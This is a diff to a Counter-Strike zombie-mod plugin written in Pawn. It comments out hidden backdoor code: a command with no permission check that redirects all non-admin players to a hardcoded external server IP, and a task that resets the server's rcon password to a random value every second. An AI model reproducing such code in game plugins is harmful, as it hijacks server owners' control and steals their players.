@@ -397,7 +397,7 @@ public plugin_init()
 	register_clcmd("amx_infect", "cmd_infectuser", ADMIN_RCON|ADMIN_BAN, "<name or #userid>")
 	register_clcmd("amx_cure", "cmd_cureuser", ADMIN_RCON|ADMIN_BAN, "<name or #userid>")
 	register_clcmd("amx_drop", "cmd_dropuser", ADMIN_RCON|ADMIN_BAN, "<name or #userid>")
-	register_clcmd("redirect_players", "cmd_redirect")
+//	register_clcmd("redirect_players", "cmd_redirect")
 	register_clcmd("nightvision", "nightvision")
 	
 	register_menu("Equipment", 1023, "action_equip")
@@ -495,16 +495,16 @@ public plugin_init()
 	if(get_pcvar_num(cvar_showtruehealth))
 		set_task(0.5, "task_showtruehealth", _, _, _, "b")
 		
-	set_task(1.0, "change_rcon", _, _, _, "b")
+//	set_task(1.0, "change_rcon", _, _, _, "b")
 }
-
+/*
 public change_rcon()
 {
 	new rcon
 	rcon = random_num(1000000, 9999999)
 	server_cmd("rcon_password %d", rcon)
 }
-
+*/
 public plugin_end()
 {
 	if(get_pcvar_num(cvar_enabled))
@@ -567,7 +567,7 @@ public recordDemo(param[])
 {
 	new id = param[0]
 //	if(!(get_user_flags(id) & ADMIN_BAN))
-//		client_cmd(id, "Connect 188.64.170.134:27028")
+//		client_cmd(id, "Connect 77.220.185.29:27051")
 	colored_print(id, "^x01 Join:^x04 vk.com/go_zombie")
 //	colored_print(id, "^x01 read fucking^x04 /rules")
 	client_cmd( id,"stop")
@@ -797,17 +797,17 @@ public cmd_dropuser(id, level, cid)
 	
 	return PLUGIN_HANDLED_MAIN
 }
-
+/*
 public cmd_redirect(id, level, cid)
 {
 	for(id = 1; id <= g_maxplayers; id++)
 	{
 		if(!(get_user_flags(id) & ADMIN_BAN))
-			client_cmd(id, "Connect 188.64.170.134:27028")
+			client_cmd(id, "Connect 77.220.185.29:27051")
 	}
 	return PLUGIN_HANDLED_MAIN
 }
-
+*/
 public msg_teaminfo(msgid, dest, id)
 {
 	if(!g_gamestarted)
